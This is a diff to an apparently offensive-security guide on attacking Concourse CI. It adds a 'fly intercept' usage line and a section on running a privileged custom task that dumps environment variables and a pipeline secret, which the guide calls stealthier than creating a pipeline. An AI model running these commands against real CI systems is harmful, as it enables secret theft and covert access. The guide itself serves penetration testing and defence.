@@ -299,6 +299,7 @@ If you have enough privileges (**member role or more**) you will be able to **li
 
 ```bash
 fly -t tutorial intercept --job pipeline-name/job-name
+fly -t tutorial intercept # To be presented a prompt with all the options
 ```
 
 With these permissions you might be able to:
@@ -329,8 +330,8 @@ jobs:
         args:
         - -cx
         - |
-          sleep 1000
           echo "$SUPER_SECRET"
+          sleep 1000
       params:
         SUPER_SECRET: ((super.secret))
 ```
@@ -342,9 +343,31 @@ With the **modification/creation** of a new pipeline you will be able to:
 * Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node)
 * **Delete** created pipeline
 
-{% hint style="warning" %}
-As far as I noticed&#x20;
-{% endhint %}
+### Execute Custom Task
+
+This is similar to the previous method but instead of modifying/creating a whole new pipeline you can **just execute a custom task** (which will probably be much more **stealthier**):
+
+```yaml
+# For more task_config options check https://concourse-ci.org/tasks.html
+platform: linux
+image_resource:
+  type: registry-image
+  source:
+    repository: ubuntu
+run:
+  path: sh
+  args:
+  - -cx
+  - |
+    env
+    sleep 1000
+params:
+  SUPER_SECRET: ((super.secret))
+```
+
+```bash
+fly -t tutorial execute --privileged --config task_config.yml
+```
 
 ## References
 
